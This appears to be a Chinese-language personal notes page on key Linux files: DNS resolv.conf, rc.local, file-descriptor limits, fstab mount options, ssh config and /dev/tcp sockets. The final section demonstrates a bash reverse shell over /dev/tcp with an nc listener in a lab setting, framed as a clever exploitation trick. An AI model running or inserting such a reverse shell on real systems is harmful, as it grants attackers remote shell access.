

Linux 的配置文件按道理应全部放到 /etc 目录。但是这里也记录一些 Linux 中的关键文件

## DNS 配置文件

`/etc/resolv.conf` 文件保存有 DNS 的配置。其内容如下：

- nameserver表示解析域名时使用该地址指定的主机为域名服务器。其中域名服务器是按照文件中出现的顺序来查询的,且只有当第一个nameserver没有反应时才查询下面的nameserver。

- domain　　　声明主机的域名。很多程序用到它，如邮件系统；当为没有域名的主机进行DNS查询时，也要用到。如果没有域名，主机名将被使用，删除所有在第一个点( .)前面的内容。

- search　　　它的多个参数指明域名查询顺序。当要查询没有域名的主机，主机将在由search声明的域中分别查找。domain和search不能共存；如果同时存在，后面出现的将会被使用。

- sortlist　　允许将得到域名结果进行特定的排序。它的参数为网络/掩码对，允许任意的排列顺序。

## 初始化配置文件

`/etc/rc.local` 这个文件用于开启启动一些服务，也可以添加一些 mount 挂载命令，在开启启动时进行挂载。



## 网络命名空间目录

`/var/run/netns/` 中



## 调整文件描述符数量

因为 Linux 系统为每个 TCP 建立连接时，都要创建一个 socket 句柄，每个 socket 句柄同时也是一个文件句柄。而系统对用户打开的文件句柄是有限制的，看到这里，也就理解了为什么在高并发时会出现 "too many open files"。

显示当前文件描述符数量：

```
ulimit -n
```

在 `/etc/security/limits.conf` 最后添加如下四行调整最大文件描述符和最大进程数量：

```
* soft nproc  65535
* hard nproc  65535
* soft nofile 65535
* hard nofile 65535
```

重启当前命令行生效

> 注意
> soft nofile （软限制）是指Linux在当前系统能够承受的范围内进一步限制用户同时打开的文件数
> hard nofile （硬限制）是根据系统硬件资源状况(主要是系统内存)计算出来的系统最多可同时打开的文件数量
> 通常软限制小于或等于硬限制。
> `*` 表示所有用户，也可以指定具体的用户名
> 所有进程打开的文件描述符数不能超过 /proc/sys/fs/file-max
> 单个进程打开的文件描述符数不能超过user limit中nofile的soft limit
> nofile的hard limit不能超过/proc/sys/fs/nr_open

上面的修改只是对用户的单一进程允许打开的最大文件数进行的设置。但是Linux系统对所有用户打开文件数也有限制（硬限制），一般情况下，不用修改此值。

```Bash
# 查看所有用户打开文件数的最大限制（此值与硬件配置有关）
cat /proc/sys/fs/file-max
```

但是，文件数再大，随着并发量的上升，也总有用完的时候。这时候再看 “文件都可以用「打开(open) –> 读写(write/read) –> 关闭(close)」模式来进行操作”这句话，就会想到，可以把已经用过的文件句柄释放掉，来减少资源的占用，这就又涉及到了资源重新利用和回收的问题。有时候查看端口有特别多的 `TIME_WAIT` 时，就是因为连接本身是关闭的，但资源还没有释放。

## 命令行终端提示符

常用的命令行标识符为：

```bash
export PS1='[\u@\h \W]\$ '
```



## CA 证书目录

`/etc/pki/ca-trust/source/anchors/`

把CA证书放到这个目录之后，执行 `update-ca-trust` 更新证书。



## SSH 默认配置

ssh 连接设置默认端口配置文件：

```
$ cat ～/.ssh/config 
Host node46
    Hostname node46
    User root
    Port 22222
Host node47
    Hostname node47
    User root
    Port 22222
Host node49
    Hostname node49
    User root
    Port 22222
```



## 磁盘挂载配置文件

磁盘挂载的配置文件是 `/etc/fstab`，注意这个文件是用于开机自动挂载的，如果开机时找不到挂载的磁盘，就会造成开机失败，需要先进入安全模式改这个文件再开机，所以临时挂载的磁盘不要房到这个目录。

下面是一个配置示例：

```
UUID=c5e73700-97ac-484d-82bf-2c9e670bc4ab /data1  xfs   defaults,noatime,nodiratime        0 0
UUID=6ae6bbb3-392f-4a1b-8f2c-baa4e753ec67 /data2  xfs   defaults,noatime,nodiratime        0 0
```

这里最好写 UUID 可以唯一识别一个磁盘的文件系统。

#### noatime,nodiratime

在 Linux 中，有以下几种时间：

| 简名  | 全名        | 中文名   | 含义                                     |
| ----- | ----------- | -------- | ---------------------------------------- |
| atime | access time | 访问时间 | 文件中的数据库最后被访问的时间           |
| mtime | modify time | 修改时间 | 文件内容被修改的最后时间                 |
| ctime | change time | 变化时间 | 文件的元数据发生变化。比如权限，所有者等 |

其中，atime 会经常变化，为了提高文件系统IO性能，会在挂载文件系统的时候指定“noatime,nodiratime”参数，意味着当访问一个文件和目录的时候，access time都不会更新。

通过以下命令可以查看文件的各种时间：

```bash
$ stat test.txt
```

#### 转储频率

    0：从不备份
    1：每日备份
    2：每隔一天备份


#### 自检次序：

```
0: 不自检
1：首先自检，通常只能被/使用；
2：等数字为1的自检完成后，再进行自检
```





## /dev/tcp

Linux中的一个特殊文件： /dev/tcp  打开这个文件就类似于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。

实验，在一台机器上(10.100.3.1)启动一个 TCP 端口：

```bash
$ nc -lvvp 7777
```

- -l, --listen               监听 TCP
- -v, --verbose              设置详细级别（可多次使用）
- -p, --source-port port     指定使用的端口

在另一台机器(10.100.3.2)上执行：

```bash
$ echo "hello" > /dev/tcp/10.100.3.1/7777
```

就会往这个 TCP 端口中写入数据，写完后就会退出。



#### 远程执行

这里有个巧妙的利用：  [漏洞实验.md](SSH/漏洞实验.md) 

```bash
$ bash -i >& /dev/tcp/10.100.3.1/7777 0>&1
```

`bash -i` 是启动一个新的命令行，`bash -i >&` 是将输入和输出重定向到 TCP 连接，`0>&1` 将标准输入和标准输出重定向到一个地方，即 TCP 连接中，这样就实现了类似远程执行的功能。

这种是需要两端配合来远程执行，但是通过 scp 的漏洞可以实现在一方操作之后就可以远程执行。

> 关于重定向：https://www.runoob.com/linux/linux-shell-io-redirections.html
>
> `n >& m`  将输出文件 m 和 n 合并。
>
> 需要注意的是文件描述符 0 通常是标准输入（STDIN），1 是标准输出（STDOUT），2 是标准错误输出（STDERR）。

















